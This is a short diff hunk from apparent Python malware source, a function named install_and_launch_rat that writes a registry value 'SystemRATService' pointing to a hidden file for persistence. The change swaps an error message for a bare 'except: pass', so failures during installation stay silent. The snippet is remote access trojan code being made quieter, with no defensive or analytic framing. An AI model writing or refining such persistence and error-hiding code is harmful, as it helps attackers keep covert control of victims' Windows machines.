@@ -27,6 +27,6 @@ def install_and_launch_rat():
             winreg.SetValueEx(key, "SystemRATService", 0, winreg.REG_SZ, hidden_path) # Set registry for persistence  
             winreg.CloseKey(key)
 
-        except Exception as e:
-            print(f"Error during installation: {e}")
+        except: pass
                 
+            
